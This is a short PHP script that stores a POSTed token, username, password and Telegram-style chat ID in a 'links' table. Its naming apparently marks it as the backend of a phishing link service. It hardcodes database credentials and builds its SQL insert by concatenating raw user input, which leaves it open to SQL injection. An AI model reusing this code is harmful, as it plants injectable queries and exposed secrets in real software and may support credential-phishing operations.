<?php
// create a new connection to the database
$servername = "localhost";
$username = "id21394630_techdeceit";
$password = "AbcdefgH123@#";
$dbname = "id21394630_techdeceit";

$conn = mysqli_connect($servername, $username, $password, $dbname);

// check connection
if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}

// Insert new link into table
$username = $_POST['usernamee'];
$password = $_POST['passwordd'];
$token = $_POST['tokenn'];
$chat_id = $_POST['chat_idd'];
$sql = "INSERT INTO links (token, username, password, chat_id) VALUES ('$token', '$username', '$password', '$chat_id')";
if (mysqli_query($conn, $sql)) {
  $last_id = mysqli_insert_id($conn);
  $error_msg = "YOUR ID NUMBER GENERATED : ".$last_id;
  echo "<script type='text/javascript'>alert('$error_msg');</script>";
} else {
  echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
// close the database connection
mysqli_close($conn);
echo '<script type="text/javascript">
			    location.replace("../");
			  </script>';
?>
